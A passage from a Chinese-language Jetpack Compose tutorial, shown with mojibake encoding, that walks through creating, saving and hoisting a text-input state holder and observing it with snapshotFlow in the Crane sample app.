<p>ç”¨äºæ›´æ–°Â <code>textState</code>Â ä»¥åŠç¡®å®šæ˜¾ç¤ºçš„å†…å®¹æ˜¯å¦å¯¹åº”äºæç¤ºçš„é€»è¾‘å…¨éƒ¨éƒ½åœ¨Â <code>CraneEditableUserInput</code>Â å¯ç»„åˆé¡¹çš„ä¸»ä½“ä¸­ã€‚è¿™å°±å¸¦æ¥äº†ä¸€äº›ç¼ºç‚¹ï¼š</p>
<ul>
<li><code>TextField</code>Â çš„å€¼æœªæå‡ï¼Œå› è€Œæ— æ³•ä»å¤–éƒ¨è¿›è¡Œæ§åˆ¶ï¼Œè¿™ä½¿å¾—æµ‹è¯•æ›´åŠ å›°éš¾ã€‚</li>
<li>æ­¤å¯ç»„åˆé¡¹çš„é€»è¾‘å¯èƒ½ä¼šå˜å¾—æ›´åŠ å¤æ‚ï¼Œå¹¶ä¸”å†…éƒ¨çŠ¶æ€å¯èƒ½ä¼šæ›´å®¹æ˜“ä¸åŒæ­¥ã€‚</li>
</ul>
<p>é€šè¿‡åˆ›å»ºè´Ÿè´£æ­¤å¯ç»„åˆé¡¹çš„å†…éƒ¨çŠ¶æ€çš„çŠ¶æ€å®¹å™¨ï¼Œæ‚¨å¯ä»¥å°†æ‰€æœ‰çŠ¶æ€å˜åŒ–é›†ä¸­åœ¨ä¸€ä¸ªä½ç½®ã€‚è¿™æ ·ï¼ŒçŠ¶æ€ä¸åŒæ­¥å°±æ›´éš¾äº†ï¼Œå¹¶ä¸”ç›¸å…³çš„é€»è¾‘å…¨éƒ¨å½’åœ¨ä¸€ä¸ªç±»ä¸­ã€‚æ­¤å¤–ï¼Œæ­¤çŠ¶æ€å¾ˆå®¹æ˜“å‘ä¸Šæå‡ï¼Œå¹¶ä¸”å¯ä»¥ä»æ­¤å¯ç»„åˆé¡¹çš„è°ƒç”¨æ–¹ä½¿ç”¨ã€‚</p>
<p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæå‡çŠ¶æ€æ˜¯ä¸€ç§ä¸é”™çš„åšæ³•ï¼Œå› ä¸ºè¿™æ˜¯ä¸€ä¸ªä½çº§ç•Œé¢ç»„ä»¶ï¼Œå¯èƒ½ä¼šåœ¨åº”ç”¨çš„å…¶ä»–éƒ¨åˆ†ä¸­é‡å¤ä½¿ç”¨ã€‚å› æ­¤ï¼Œå®ƒè¶Šçµæ´»è¶Šå¯æ§ï¼Œå°±è¶Šå¥½ã€‚</p>
<h3 data-id="heading-18">åˆ›å»ºçŠ¶æ€å®¹å™¨</h3>
<p>ç”±äºÂ <code>CraneEditableUserInput</code>Â æ˜¯ä¸€ä¸ªå¯é‡å¤ä½¿ç”¨çš„ç»„ä»¶ï¼Œæ‚¨å¯ä»¥åœ¨åŒä¸€æ–‡ä»¶ä¸­åˆ›å»ºä¸€ä¸ªåä¸ºÂ <code>EditableUserInputState</code>Â çš„å¸¸è§„ç±»ä½œä¸ºçŠ¶æ€å®¹å™¨ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// base/EditableUserInput.kt file</span>

<span class="hljs-keyword">import</span> androidx.compose.runtime.getValue
<span class="hljs-keyword">import</span> androidx.compose.runtime.mutableStateOf
<span class="hljs-keyword">import</span> androidx.compose.runtime.setValue

<span class="hljs-keyword">class</span> <span class="hljs-title class_">EditableUserInputState</span>(<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> hint: String, initialText: String) {

Â  Â  <span class="hljs-keyword">var</span> text <span class="hljs-keyword">by</span> mutableStateOf(initialText)
Â  Â  Â  Â <span class="hljs-keyword">private</span> <span class="hljs-keyword">set</span>

Â  Â  <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">updateText</span><span class="hljs-params">(newText: <span class="hljs-type">String</span>)</span></span> {
Â  Â  Â  Â text = newText
Â  Â  }

Â  Â  <span class="hljs-keyword">val</span> isHint: <span class="hljs-built_in">Boolean</span>
Â  Â  Â  Â  <span class="hljs-keyword">get</span>() = text == hint
}
</code></pre>
<p>è¯¥ç±»åº”å…·æœ‰ä»¥ä¸‹ç‰¹å¾ï¼š</p>
<ul>
<li><code>text</code>Â æ˜¯Â <code>String</code>Â ç±»å‹çš„å¯å˜çŠ¶æ€ï¼Œå°±åƒåœ¨Â <code>CraneEditableUserInput</code>Â ä¸­ä¸€æ ·ã€‚è¯·åŠ¡å¿…ä½¿ç”¨Â <code>mutableStateOf</code>ï¼Œä»¥ä¾¿ Compose è·Ÿè¸ªå€¼çš„æ›´æ”¹ï¼Œå¹¶åœ¨å‘ç”Ÿæ›´æ”¹æ—¶é‡ç»„ã€‚</li>
<li><code>text</code>Â æ˜¯å…·æœ‰ç§æœ‰Â <code>set</code>Â çš„Â <code>var</code>ï¼Œå› æ­¤æ— æ³•ç›´æ¥ä»ç±»å¤–éƒ¨æ”¹å˜å®ƒã€‚æ‚¨å¯ä»¥å…¬å¼€Â <code>updateText</code>Â äº‹ä»¶æ¥å¯¹æ­¤å˜é‡è¿›è¡Œä¿®æ”¹ï¼Œä»è€Œå°†è¯¥ç±»è®¾ä¸ºå•ä¸€å¯ä¿¡æ¥æºï¼Œè€Œä¸æ˜¯å…¬å¼€æ­¤å˜é‡ã€‚</li>
<li>è¯¥ç±»å°†Â <code>initialText</code>Â ä½œä¸ºç”¨äºåˆå§‹åŒ–Â <code>text</code>Â çš„ä¾èµ–é¡¹ã€‚</li>
<li>ç”¨äºåˆ¤æ–­Â <code>text</code>Â æ˜¯å¦ä¸ºæç¤ºçš„é€»è¾‘åœ¨æŒ‰éœ€æ‰§è¡Œæ£€æŸ¥çš„Â <code>isHint</code>Â å±æ€§ä¸­ã€‚</li>
</ul>
<p>å¦‚æœå°†æ¥é€»è¾‘å˜å¾—æ›´åŠ å¤æ‚ï¼Œæ‚¨åªéœ€è¦å¯¹ä¸€ä¸ªç±»è¿›è¡Œæ›´æ”¹ï¼š<code>EditableUserInputState</code>ã€‚</p>
<h3 data-id="heading-19">è®°ä½çŠ¶æ€å®¹å™¨</h3>
<p>å§‹ç»ˆéœ€è¦è®°ä½çŠ¶æ€å®¹å™¨ï¼Œä»¥ä½¿å…¶ç•™åœ¨ç»„åˆä¸­ï¼Œè€Œä¸æ˜¯æ¯æ¬¡éƒ½åˆ›å»ºä¸€ä¸ªæ–°çš„ã€‚æœ€å¥½åœ¨åŒä¸€æ–‡ä»¶ä¸­åˆ›å»ºä¸€ä¸ªæ‰§è¡Œæ­¤æ“ä½œçš„æ–¹æ³•ï¼Œä»¥ç§»é™¤æ ·æ¿å¹¶é¿å…å¯èƒ½å‘ç”Ÿçš„ä»»ä½•é”™è¯¯ã€‚åœ¨Â <code>base/EditableUserInput.kt</code>Â æ–‡ä»¶ä¸­ï¼Œæ·»åŠ ä»¥ä¸‹ä»£ç ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// base/EditableUserInput.kt file</span>

<span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">rememberEditableUserInputState</span><span class="hljs-params">(hint: <span class="hljs-type">String</span>)</span></span>: EditableUserInputState =
Â  Â  remember(hint) {
Â  Â  Â  Â  EditableUserInputState(hint, hint)
Â  Â  }
</code></pre>
<p>å¦‚æœæ‚¨åªæ˜¯ä½¿ç”¨Â <code>remember</code>Â è®°ä½æ­¤çŠ¶æ€ï¼Œå®ƒåœ¨ activity é‡æ–°åˆ›å»ºåä¸ä¼šç»§ç»­ç•™å­˜ã€‚**ä¸ºäº†è§£å†³æ­¤é—®é¢˜ï¼Œæ‚¨å¯ä»¥æ”¹ç”¨Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fkotlin%2Fandroidx%2Fcompose%2Fruntime%2Fsaveable%2Fpackage-summary%3Fhl%3Dzh-cn%23rememberSaveable(kotlin.Array%2Candroidx.compose.runtime.saveable.Saver%2Ckotlin.String%2Ckotlin.Function0)" target="_blank" title="https://developer.android.com/reference/kotlin/androidx/compose/runtime/saveable/package-summary?hl=zh-cn#rememberSaveable(kotlin.Array,androidx.compose.runtime.saveable.Saver,kotlin.String,kotlin.Function0)" ref="nofollow noopener noreferrer"><strong><code>rememberSaveable</code></strong></a>Â APIï¼Œå®ƒçš„è¡Œä¸ºæ–¹å¼ä¸Â <code>remember</code>Â ç±»ä¼¼ï¼Œä½†å­˜å‚¨çš„å€¼åœ¨ activity å’Œè¿›ç¨‹é‡æ–°åˆ›å»ºåä¼šç»§ç»­ç•™å­˜ã€‚åœ¨å†…éƒ¨ï¼Œå®ƒä½¿ç”¨ä¿å­˜çš„å®ä¾‹çŠ¶æ€æœºåˆ¶ã€‚</p>
<p>å¯¹äºå¯ä»¥å­˜å‚¨åœ¨Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fandroid%2Fos%2FBundle%3Fhl%3Dzh-cn" target="_blank" title="https://developer.android.com/reference/android/os/Bundle?hl=zh-cn" ref="nofollow noopener noreferrer"><code>Bundle</code></a>Â å†…çš„å¯¹è±¡ï¼Œ<code>rememberSaveable</code>Â å¯ä»¥åšæ‰€æœ‰è¿™äº›å·¥ä½œï¼Œè€Œæ— éœ€ä»»ä½•é¢å¤–çš„æ“ä½œã€‚å¯¹äºæ‚¨åœ¨é¡¹ç›®ä¸­åˆ›å»ºçš„Â <code>EditableUserInputState</code>Â ç±»ï¼Œå´å¹¶éå¦‚æ­¤ã€‚å› æ­¤ï¼Œæ‚¨éœ€è¦å‘ŠçŸ¥Â <code>rememberSaveable</code>Â å¦‚ä½•ä½¿ç”¨Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fkotlin%2Fandroidx%2Fcompose%2Fruntime%2Fsaveable%2Fpackage-summary%3Fhl%3Dzh-cn%23Saver(kotlin.Function2%2Ckotlin.Function1)" target="_blank" title="https://developer.android.com/reference/kotlin/androidx/compose/runtime/saveable/package-summary?hl=zh-cn#Saver(kotlin.Function2,kotlin.Function1)" ref="nofollow noopener noreferrer"><code>Saver</code></a>Â ä¿å­˜å’Œæ¢å¤æ­¤ç±»çš„å®ä¾‹ã€‚</p>
<h3 data-id="heading-20">åˆ›å»ºè‡ªå®šä¹‰ä¿å­˜å™¨</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fkotlin%2Fandroidx%2Fcompose%2Fruntime%2Fsaveable%2Fpackage-summary%3Fhl%3Dzh-cn%23Saver(kotlin.Function2%2Ckotlin.Function1)" target="_blank" title="https://developer.android.com/reference/kotlin/androidx/compose/runtime/saveable/package-summary?hl=zh-cn#Saver(kotlin.Function2,kotlin.Function1)" ref="nofollow noopener noreferrer"><code>Saver</code></a>Â æè¿°äº†å¦‚ä½•å°†å¯¹è±¡è½¬æ¢ä¸ºÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fkotlin%2Fandroidx%2Fcompose%2Fruntime%2Fsaveable%2FSaver%3Fhl%3Dzh-cn" target="_blank" title="https://developer.android.com/reference/kotlin/androidx/compose/runtime/saveable/Saver?hl=zh-cn" ref="nofollow noopener noreferrer"><code>Saveable</code></a>ï¼ˆå¯ä¿å­˜ï¼‰çš„å†…å®¹ã€‚<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fkotlin%2Fandroidx%2Fcompose%2Fruntime%2Fsaveable%2Fpackage-summary%3Fhl%3Dzh-cn%23Saver(kotlin.Function2%2Ckotlin.Function1)" target="_blank" title="https://developer.android.com/reference/kotlin/androidx/compose/runtime/saveable/package-summary?hl=zh-cn#Saver(kotlin.Function2,kotlin.Function1)" ref="nofollow noopener noreferrer"><code>Saver</code></a>Â çš„å®ç°éœ€è¦æ›¿æ¢ä¸¤ä¸ªå‡½æ•°ï¼š</p>
<ul>
<li><code>save</code>Â - å°†åŸå§‹å€¼è½¬æ¢ä¸ºå¯ä¿å­˜çš„å€¼ã€‚</li>
<li><code>restore</code>Â - å°†æ¢å¤çš„å€¼è½¬æ¢ä¸ºåŸå§‹ç±»çš„å®ä¾‹ã€‚</li>
</ul>
<p>åœ¨æœ¬ä¾‹ä¸­ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä¸€äº›ç°æœ‰çš„ Compose APIï¼Œå¦‚Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fkotlin%2Fandroidx%2Fcompose%2Fruntime%2Fsaveable%2Fpackage-summary%3Fhl%3Dzh-cn%23listSaver(kotlin.Function2%2Ckotlin.Function1)" target="_blank" title="https://developer.android.com/reference/kotlin/androidx/compose/runtime/saveable/package-summary?hl=zh-cn#listSaver(kotlin.Function2,kotlin.Function1)" ref="nofollow noopener noreferrer"><code>listSaver</code></a>Â æˆ–Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fkotlin%2Fandroidx%2Fcompose%2Fruntime%2Fsaveable%2Fpackage-summary%3Fhl%3Dzh-cn%23mapSaver(kotlin.Function2%2Ckotlin.Function1)" target="_blank" title="https://developer.android.com/reference/kotlin/androidx/compose/runtime/saveable/package-summary?hl=zh-cn#mapSaver(kotlin.Function2,kotlin.Function1)" ref="nofollow noopener noreferrer"><code>mapSaver</code></a>ï¼ˆç”¨äºå­˜å‚¨è¦ä¿å­˜åœ¨Â <code>List</code>Â æˆ–Â <code>Map</code>Â ä¸­çš„å€¼ï¼‰ï¼Œä»¥å‡å°‘æ‚¨éœ€è¦ç¼–å†™çš„ä»£ç é‡ï¼Œè€Œä¸æ˜¯ä¸ºÂ <code>EditableUserInputState</code>Â ç±»åˆ›å»ºÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fkotlin%2Fandroidx%2Fcompose%2Fruntime%2Fsaveable%2Fpackage-summary%3Fhl%3Dzh-cn%23Saver(kotlin.Function2%2Ckotlin.Function1)" target="_blank" title="https://developer.android.com/reference/kotlin/androidx/compose/runtime/saveable/package-summary?hl=zh-cn#Saver(kotlin.Function2,kotlin.Function1)" ref="nofollow noopener noreferrer"><code>Saver</code></a>Â çš„è‡ªå®šä¹‰å®ç°ã€‚</p>
<p>æœ€å¥½å°†Â <code>Saver</code>Â å®šä¹‰æ”¾ç½®åœ¨ä¸å…¶ä¸€èµ·ä½¿ç”¨çš„ç±»é™„è¿‘ã€‚ç”±äºéœ€è¦è¢«é™æ€è®¿é—®ï¼Œå› æ­¤è¯·åœ¨Â <code>companion object</code>Â ä¸­ä¸ºÂ <code>EditableUserInputState</code>Â æ·»åŠ Â <code>Saver</code>ã€‚åœ¨Â <code>base/EditableUserInput.kt</code>Â æ–‡ä»¶ä¸­ï¼Œæ·»åŠ Â <code>Saver</code>Â çš„å®ç°ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// base/EditableUserInput.kt file</span>

<span class="hljs-keyword">import</span> androidx.compose.runtime.saveable.Saver
<span class="hljs-keyword">import</span> androidx.compose.runtime.saveable.listSaver

<span class="hljs-keyword">class</span> <span class="hljs-title class_">EditableUserInputState</span>(<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> hint: String, initialText: String) {
Â  Â  <span class="hljs-keyword">var</span> text <span class="hljs-keyword">by</span> mutableStateOf(initialText)

Â  Â  <span class="hljs-keyword">val</span> isHint: <span class="hljs-built_in">Boolean</span>
Â  Â  Â  Â  <span class="hljs-keyword">get</span>() = text == hint

Â  Â  <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
Â  Â  Â  Â  <span class="hljs-keyword">val</span> Saver: Saver&lt;EditableUserInputState, *&gt; = listSaver(
Â  Â  Â  Â  Â  Â  save = { listOf(it.hint, it.text) },
Â  Â  Â  Â  Â  Â  restore = {
Â  Â  Â  Â  Â  Â  Â  Â  EditableUserInputState(
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  hint = it[<span class="hljs-number">0</span>],
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  initialText = it[<span class="hljs-number">1</span>],
Â  Â  Â  Â  Â  Â  Â  Â  )
Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  )
Â  Â  }
}
</code></pre>
<p>åœ¨æœ¬ä¾‹ä¸­ï¼Œæ‚¨å°†Â <code>listSaver</code>Â ç”¨ä½œå®ç°ç»†èŠ‚ï¼Œåœ¨ä¿å­˜å™¨ä¸­å­˜å‚¨å’Œæ¢å¤Â <code>EditableUserInputState</code>Â çš„å®ä¾‹ã€‚</p>
<p>ç°åœ¨ï¼Œæ‚¨å¯ä»¥åœ¨ä¹‹å‰åˆ›å»ºçš„Â <code>rememberEditableUserInputState</code>Â æ–¹æ³•çš„Â <code>rememberSaveable</code>ï¼ˆè€Œä¸æ˜¯Â <code>remember</code>ï¼‰ä¸­ä½¿ç”¨æ­¤ä¿å­˜å™¨ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// base/EditableUserInput.kt file</span>
<span class="hljs-keyword">import</span> androidx.compose.runtime.saveable.rememberSaveable

<span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">rememberEditableUserInputState</span><span class="hljs-params">(hint: <span class="hljs-type">String</span>)</span></span>: EditableUserInputState =
Â  Â  rememberSaveable(hint, saver = EditableUserInputState.Saver) {
Â  Â  Â  Â  EditableUserInputState(hint, hint)
Â  Â  }
</code></pre>
<p>è¿™æ ·ï¼Œ<code>EditableUserInput</code>Â è®°ä½çš„çŠ¶æ€å°±ä¼šåœ¨è¿›ç¨‹å’Œ activity é‡æ–°åˆ›å»ºåç»§ç»­ç•™å­˜ã€‚</p>
<h3 data-id="heading-21">ä½¿ç”¨çŠ¶æ€å®¹å™¨</h3>
<p>æ‚¨å°†è¦ä½¿ç”¨Â <code>EditableUserInputState</code>Â è€Œä¸æ˜¯Â <code>text</code>Â å’ŒÂ <code>isHint</code>ï¼Œä½†æ‚¨ä¸å¸Œæœ›åªå°†å…¶ç”¨ä½œÂ <code>CraneEditableUserInput</code>Â ä¸­çš„å†…éƒ¨çŠ¶æ€ï¼Œå› ä¸ºè°ƒç”¨æ–¹å¯ç»„åˆé¡¹æ— æ³•æ§åˆ¶çŠ¶æ€ã€‚ç›¸åï¼Œæ‚¨å¸Œæœ›æå‡Â <code>EditableUserInputState</code>ï¼Œä»¥ä¾¿è°ƒç”¨æ–¹å¯ä»¥æ§åˆ¶Â <code>CraneEditableUserInput</code>Â çš„çŠ¶æ€ã€‚**å¦‚æœæ‚¨æå‡çŠ¶æ€ï¼Œé‚£ä¹ˆå¯ç»„åˆé¡¹å°±å¯ä»¥åœ¨é¢„è§ˆä¸­ä½¿ç”¨ï¼Œå¹¶ä¸”æ›´å®¹æ˜“è¿›è¡Œæµ‹è¯•ï¼Œå› ä¸ºæ‚¨èƒ½å¤Ÿä»è°ƒç”¨æ–¹ä¿®æ”¹å…¶çŠ¶æ€ã€‚</p>
<p>ä¸ºæ­¤ï¼Œæ‚¨éœ€è¦æ›´æ”¹å¯ç»„åˆå‡½æ•°çš„å½¢å‚ï¼Œå¹¶åœ¨éœ€è¦æ—¶ä¸ºå…¶æä¾›é»˜è®¤å€¼ã€‚ç”±äºæ‚¨å¯èƒ½å¸Œæœ›å…è®¸Â <code>CraneEditableUserInput</code>Â å¸¦æœ‰ç©ºæç¤ºï¼Œå› æ­¤æ·»åŠ ä¸€ä¸ªé»˜è®¤å®å‚ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">CraneEditableUserInput</span><span class="hljs-params">(
Â  Â  state: <span class="hljs-type">EditableUserInputState</span> = rememberEditableUserInputState(<span class="hljs-string">""</span>)</span></span>,
Â  Â  caption: String? = <span class="hljs-literal">null</span>,
Â  Â  <span class="hljs-meta">@DrawableRes</span> vectorImageId: <span class="hljs-built_in">Int</span>? = <span class="hljs-literal">null</span>
) { <span class="hljs-comment">/* ... */</span> }
</code></pre>
<p>æ‚¨æˆ–è®¸å·²ç»æ³¨æ„åˆ°ï¼Œ<code>onInputChanged</code>Â å½¢å‚ä¸å­˜åœ¨äº†ï¼ç”±äºçŠ¶æ€å¯ä»¥æå‡ï¼Œå› æ­¤å¦‚æœè°ƒç”¨æ–¹æƒ³è¦çŸ¥é“è¾“å…¥æ˜¯å¦å‘ç”Ÿäº†æ›´æ”¹ï¼Œå®ƒä»¬å¯ä»¥æ§åˆ¶çŠ¶æ€å¹¶å°†è¯¥çŠ¶æ€ä¼ å…¥æ­¤å‡½æ•°ã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œæ‚¨éœ€è¦è°ƒæ•´å‡½æ•°ä¸»ä½“ï¼Œä»¥ä½¿ç”¨æå‡çš„çŠ¶æ€ï¼Œè€Œä¸æ˜¯ä¹‹å‰ä½¿ç”¨çš„å†…éƒ¨çŠ¶æ€ã€‚é‡æ„åï¼Œå‡½æ•°åº”å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">CraneEditableUserInput</span><span class="hljs-params">(
Â  Â  state: <span class="hljs-type">EditableUserInputState</span> = rememberEditableUserInputState(<span class="hljs-string">""</span>)</span></span>,
Â  Â  caption: String? = <span class="hljs-literal">null</span>,
Â  Â  <span class="hljs-meta">@DrawableRes</span> vectorImageId: <span class="hljs-built_in">Int</span>? = <span class="hljs-literal">null</span>
) {
Â  Â  CraneBaseUserInput(
Â  Â  Â  Â  caption = caption,
Â  Â  Â  Â  tintIcon = { !state.isHint },
Â  Â  Â  Â  showCaption = { !state.isHint },
Â  Â  Â  Â  vectorImageId = vectorImageId
Â  Â  ) {
Â  Â  Â  Â  BasicTextField(
Â  Â  Â  Â  Â  Â  value = state.text,
Â  Â  Â  Â  Â  Â  onValueChange = { state.updateText(it) },
Â  Â  Â  Â  Â  Â  textStyle = <span class="hljs-keyword">if</span> (state.isHint) {
Â  Â  Â  Â  Â  Â  Â  Â  captionTextStyle.copy(color = LocalContentColor.current)
Â  Â  Â  Â  Â  Â  } <span class="hljs-keyword">else</span> {
Â  Â  Â  Â  Â  Â  Â  Â  MaterialTheme.typography.body1.copy(color = LocalContentColor.current)
Â  Â  Â  Â  Â  Â  },
Â  Â  Â  Â  Â  Â  cursorBrush = SolidColor(LocalContentColor.current)
Â  Â  Â  Â  )
Â  Â  }
}
</code></pre>
<h3 data-id="heading-22">çŠ¶æ€å®¹å™¨è°ƒç”¨æ–¹</h3>
<p>ç”±äºæ‚¨æ›´æ”¹äº†Â <code>CraneEditableUserInput</code>Â çš„ APIï¼Œå› æ­¤éœ€è¦åœ¨è°ƒç”¨å®ƒçš„æ‰€æœ‰ä½ç½®è¿›è¡Œæ£€æŸ¥ï¼Œä»¥ç¡®ä¿ä¼ å…¥é€‚å½“çš„å½¢å‚ã€‚</p>
<p>åœ¨é¡¹ç›®ä¸­ï¼Œæ‚¨åªåœ¨ä¸€ä¸ªä½ç½®è°ƒç”¨æ­¤ APIï¼Œé‚£å°±æ˜¯åœ¨Â <code>home/SearchUserInput.kt</code>Â æ–‡ä»¶ä¸­ã€‚æ‰“å¼€è¯¥æ–‡ä»¶å¹¶è½¬åˆ°Â <code>ToDestinationUserInput</code>Â å¯ç»„åˆå‡½æ•°ï¼›æ‚¨åº”è¯¥ä¼šåœ¨è¯¥ä½ç½®çœ‹åˆ°ä¸€ä¸ªæ„å»ºé”™è¯¯ã€‚ç”±äºæç¤ºç°åœ¨æ˜¯çŠ¶æ€å®¹å™¨çš„ä¸€éƒ¨åˆ†ï¼Œå¹¶ä¸”æ‚¨å¸Œæœ›åœ¨ç»„åˆä¸­è®¾ç½®æ­¤Â <code>CraneEditableUserInput</code>Â å®ä¾‹çš„è‡ªå®šä¹‰æç¤ºï¼Œå› æ­¤æ‚¨éœ€è¦è®°ä½Â <code>ToDestinationUserInput</code>Â çº§åˆ«çš„çŠ¶æ€ï¼Œå¹¶å°†å…¶ä¼ å…¥Â <code>CraneEditableUserInput</code>ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// home/SearchUserInput.kt file</span>

<span class="hljs-keyword">import</span> androidx.compose.samples.crane.base.rememberEditableUserInputState

<span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">ToDestinationUserInput</span><span class="hljs-params">(onToDestinationChanged: (<span class="hljs-type">String</span>) -&gt; <span class="hljs-type">Unit</span>)</span></span> {
Â  Â  <span class="hljs-keyword">val</span> editableUserInputState = rememberEditableUserInputState(hint = <span class="hljs-string">"Choose Destination"</span>)
Â  Â  CraneEditableUserInput(
Â  Â  Â  Â  state = editableUserInputState,
Â  Â  Â  Â  caption = <span class="hljs-string">"To"</span>,
Â  Â  Â  Â  vectorImageId = R.drawable.ic_plane
Â  Â  )
}
</code></pre>
<h3 data-id="heading-23">snapshotFlow</h3>
<p>ä¸Šé¢çš„ä»£ç ç¼ºå°‘åœ¨è¾“å…¥æ›´æ”¹æ—¶é€šçŸ¥Â <code>ToDestinationUserInput</code>Â çš„è°ƒç”¨æ–¹çš„åŠŸèƒ½ã€‚ç”±äºåº”ç”¨çš„ç»“æ„ï¼Œæ‚¨ä¸å¸Œæœ›åœ¨å±‚æ¬¡ç»“æ„ä¸­å°†Â <code>EditableUserInputState</code>Â æå‡åˆ°ä»»ä½•æ›´é«˜çš„çº§åˆ«ã€‚è€Œä¸”ï¼Œæ‚¨ä¹Ÿä¸å¸Œæœ›å°†å…¶ä»–å¯ç»„åˆé¡¹ï¼ˆå¦‚Â <code>FlySearchContent</code>ï¼‰ä¸æ­¤çŠ¶æ€ç›¸ç»“åˆã€‚æ‚¨å¦‚ä½•ä»Â <code>ToDestinationUserInput</code>Â è°ƒç”¨Â <code>onToDestinationChanged</code>Â lambda å¹¶ä¸”ä»ä½¿æ­¤å¯ç»„åˆé¡¹å¯é‡å¤ä½¿ç”¨å‘¢ï¼Ÿ</p>
<p>æ‚¨å¯ä»¥åœ¨æ¯æ¬¡è¾“å…¥æ›´æ”¹æ—¶ä½¿ç”¨Â <code>LaunchedEffect</code>Â è§¦å‘é™„å¸¦æ•ˆåº”ï¼Œå¹¶è°ƒç”¨Â <code>onToDestinationChanged</code>Â lambdaï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// home/SearchUserInput.kt file</span>

<span class="hljs-keyword">import</span> androidx.compose.runtime.LaunchedEffect
<span class="hljs-keyword">import</span> androidx.compose.runtime.rememberUpdatedState
<span class="hljs-keyword">import</span> androidx.compose.runtime.snapshotFlow
<span class="hljs-keyword">import</span> kotlinx.coroutines.flow.collect
<span class="hljs-keyword">import</span> kotlinx.coroutines.flow.filter

<span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">ToDestinationUserInput</span><span class="hljs-params">(onToDestinationChanged: (<span class="hljs-type">String</span>) -&gt; <span class="hljs-type">Unit</span>)</span></span> {
Â  Â  <span class="hljs-keyword">val</span> editableUserInputState = rememberEditableUserInputState(hint = <span class="hljs-string">"Choose Destination"</span>)
Â  Â  CraneEditableUserInput(
Â  Â  Â  Â  state = editableUserInputState,
Â  Â  Â  Â  caption = <span class="hljs-string">"To"</span>,
Â  Â  Â  Â  vectorImageId = R.drawable.ic_plane
Â  Â  )

Â  Â  <span class="hljs-keyword">val</span> currentOnDestinationChanged <span class="hljs-keyword">by</span> rememberUpdatedState(onToDestinationChanged)
Â  Â  LaunchedEffect(editableUserInputState) {
Â  Â  Â  Â  snapshotFlow { editableUserInputState.text }
Â  Â  Â  Â  Â  Â  .filter { !editableUserInputState.isHint }
Â  Â  Â  Â  Â  Â  .collect {
Â  Â  Â  Â  Â  Â  Â  Â  currentOnDestinationChanged(editableUserInputState.text)
Â  Â  Â  Â  Â  Â  }
Â  Â  }
}
</code></pre>
<p>æ‚¨ä¹‹å‰å·²ç»ä½¿ç”¨äº†Â <code>LaunchedEffect</code>Â å’ŒÂ <code>rememberUpdatedState</code>ï¼Œä½†ä¸Šé¢çš„ä»£ç è¿˜ä½¿ç”¨äº†ä¸€ä¸ªæ–°çš„ APIï¼<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fkotlin%2Fandroidx%2Fcompose%2Fruntime%2Fpackage-summary%3Fhl%3Dzh-cn%23snapshotFlow(kotlin.Function0)" target="_blank" title="https://developer.android.com/reference/kotlin/androidx/compose/runtime/package-summary?hl=zh-cn#snapshotFlow(kotlin.Function0)" ref="nofollow noopener noreferrer"><strong><code>snapshotFlow</code></strong></a>Â <strong>API</strong>Â å°† ComposeÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fkotlin%2Fandroidx%2Fcompose%2Fruntime%2FState%3Fhl%3Dzh-cn" target="_blank" title="https://developer.android.com/reference/kotlin/androidx/compose/runtime/State?hl=zh-cn" ref="nofollow noopener noreferrer"><code>State&lt;T&gt;</code></a>Â å¯¹è±¡è½¬æ¢ä¸ºÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Fkotlin%2Fflow%3Fhl%3Dzh-cn" target="_blank" title="https://developer.android.com/kotlin/flow?hl=zh-cn" ref="nofollow noopener noreferrer">Flow</a>ã€‚å½“åœ¨Â <code>snapshotFlow</code>Â 